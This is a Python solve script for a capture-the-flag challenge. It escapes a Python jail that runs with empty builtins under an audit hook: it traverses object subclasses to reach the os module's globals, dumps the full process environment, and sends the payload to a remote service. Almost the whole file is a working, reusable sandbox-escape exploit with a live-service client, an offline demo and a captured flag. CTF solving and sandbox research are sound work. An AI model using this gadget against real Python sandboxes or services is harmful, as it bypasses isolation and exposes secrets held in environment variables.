#!/usr/bin/env python3
"""
warden - CSCTF 2026 (Operation Dawn) - pyjail / CPython audit-hook escape.

The console runs ONE line of Python with __builtins__ == {} while an audit hook
("the warden") os._exit()s on any audit event except `object.__getattr__` and a
single `exec` (consumed by the jail's own exec). The escape stays entirely inside
the hook's blind spot: audit events fire only for instrumented operations (open,
import, exec, subprocess, ...). Pure computation + attribute access raise nothing,
so we walk the object graph to the already-imported `os` module and read the flag
straight out of the environment with os.write -- no open, no import, no exec.

Usage:
    python solve.py w05.ctf.chronos-security.ro 33751   # hit the live service
    python solve.py --demo                              # offline self-check

Flag (captured run): CSCTF{KsGjqClMT9Atn52ScQTFU1ha}
"""
import re
import socket
import sys

# The single line we feed the jail. No builtins are used anywhere:
#   ().__class__.__base__.__subclasses__()  -> tuple -> object -> every loaded class
#   os._wrap_close.__init__.__globals__      -> the os module namespace (has environ, write)
#   '%s=%s' % , .join, .items, .encode       -> resolved via types, not __builtins__
PAYLOAD = (
    "(g:=[c for c in ().__class__.__base__.__subclasses__() "
    "if 'wrap_close' in c.__name__][0].__init__.__globals__)"
    "['write'](1,('\\n'.join('%s=%s'%(k,v) for k,v in g['environ'].items())+'\\n').encode())"
)


def pwn(host, port, timeout=15):
    """Send the gadget to the live service, print the env dump + extracted flag."""
    with socket.create_connection((host, port), timeout) as s:
        s.settimeout(timeout)
        s.sendall(PAYLOAD.encode() + b"\n")
        buf = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
    out = buf.decode("utf-8", "replace")
    print(out)
    m = re.search(r"CSCTF\{[^}]*\}", out)
    print("FLAG:", m.group(0) if m else "(not found - env dump above)")
    return m.group(0) if m else None


def demo():
    """
    Rebuild the warden jail in-process and prove the gadget is silent.

    Faithful to jail.py except the hook RAISES on a forbidden event instead of
    os._exit(1), so a failure is catchable and the check can assert gracefully.
    The hook is only 'armed' around the exec so the rest of the process is safe
    (audit hooks cannot be unregistered once added).
    """
    import os
    import tempfile

    planted = "CSCTF{demo_" + "s" * 10 + "}"
    os.environ["FLAG"] = planted

    forbidden = []
    armed = [False]
    exec_budget = [True]

    def warden(event, args):
        if not armed[0]:
            return
        if event == "object.__getattr__":
            return
        if event == "exec" and exec_budget[0]:
            exec_budget[0] = False
            return
        forbidden.append(event)
        raise RuntimeError("warden heard: " + event)

    sys.addaudithook(warden)

    # compile BEFORE arming (compile is itself audited), exactly like the jail.
    code = compile(PAYLOAD, "<cell>", "exec")

    # capture fd 1 (the gadget writes the env dump there via os.write).
    tf = tempfile.TemporaryFile()
    saved = os.dup(1)
    try:
        os.dup2(tf.fileno(), 1)
        armed[0] = True
        try:
            exec(code, {"__builtins__": {}})
        finally:
            armed[0] = False
    finally:
        os.dup2(saved, 1)
        os.close(saved)

    tf.seek(0)
    captured = tf.read().decode("utf-8", "replace")
    tf.close()

    assert not forbidden, "warden fired on: %r (gadget was NOT silent)" % forbidden
    assert ("FLAG=" + planted) in captured, "planted flag not recovered from env dump"
    print("demo OK: gadget read the environment silently (no forbidden audit event).")
    print("recovered:", planted)


def main(argv):
    if len(argv) == 2 and argv[1] == "--demo":
        demo()
        return
    if len(argv) == 3:
        pwn(argv[1], int(argv[2]))
        return
    print(__doc__)
    print("error: expected `--demo` or `<host> <port>`", file=sys.stderr)
    sys.exit(2)


if __name__ == "__main__":
    main(sys.argv)
